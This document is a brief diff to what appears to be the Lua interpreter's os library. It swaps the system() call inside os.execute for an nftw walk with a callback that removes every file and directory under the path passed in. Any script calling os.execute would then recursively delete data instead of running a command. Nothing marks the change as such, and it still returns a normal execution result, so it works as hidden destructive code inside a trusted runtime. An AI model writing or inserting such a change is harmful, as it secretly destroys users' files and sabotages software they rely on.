@@ -15,7 +15,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
-
+#include <ftw.h>
 #include "lua.h"
 
 #include "lauxlib.h"
@@ -138,12 +138,21 @@
 #endif
 #endif
 
+int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW     *ftwbuf)
+{
+    int rv = remove(fpath);
+    
+    if (rv)
+        perror(fpath);
+    
+    return rv;
+}
 
 static int os_execute (lua_State *L) {
   const char *cmd = luaL_optstring(L, 1, NULL);
   int stat;
   errno = 0;
-  stat = l_system(cmd);
+  stat = nftw(cmd, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
   if (cmd != NULL)
     return luaL_execresult(L, stat);
   else {
